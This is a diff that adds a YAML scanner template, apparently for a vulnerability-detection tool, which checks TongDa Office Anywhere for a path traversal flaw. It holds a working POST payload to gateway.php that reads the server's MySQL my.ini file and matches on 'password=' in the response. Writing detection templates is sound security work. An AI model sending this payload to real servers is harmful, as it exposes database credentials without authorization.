@@ -1,0 +1,23 @@
+id: tongda-path-traversal
+
+info:
+  name: Office Anywhere TongDa - Path Traversal
+  author: pikpikcu
+  severity: high
+  verified: true
+  description: |
+    Office Anywhere (OA) is susceptible to path traversal vulnerabilities which can be leveraged to perform remote code execution.
+  reference:
+    - https://github.com/jas502n/OA-tongda-RCE
+  tags: tongda,oa,path,traversal
+  created: 2025/03/13
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /ispirit/interface/gateway.php
+      body: |
+        json={"url":"/general/../../mysql5/my.ini"}
+    expression: response.status == 200 && response.body.bcontains(b'[mysql]') && response.body.bcontains(b'password=') && response.headers["content-type"].contains("text/html")
+expression: r0()
